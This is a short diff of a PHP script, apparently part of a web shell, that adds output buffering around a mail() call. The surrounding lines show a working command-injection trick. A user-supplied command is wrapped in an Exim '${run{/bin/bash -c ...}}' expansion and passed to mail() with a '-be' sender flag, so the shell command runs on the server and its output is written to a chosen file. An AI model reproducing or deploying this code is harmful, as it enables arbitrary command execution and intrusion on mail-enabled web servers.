@@ -16,6 +16,7 @@ if(!empty($comd) && !empty($fl)){
     $headers = "From: rinto@plantsec.org";
     $ms = 'Exec: ${run{/bin/bash -c "'.$comd.' >'.$fl.'"}}';
     $senders = "rinto@plantsec.org -be";
+    @ob_start();
     @mail("kreonrinto@gmail.com", "Owalah Tempix", $ms, $headers, " -f $senders ");
     $mek = @ob_get_contents();
     @ob_end_clean();
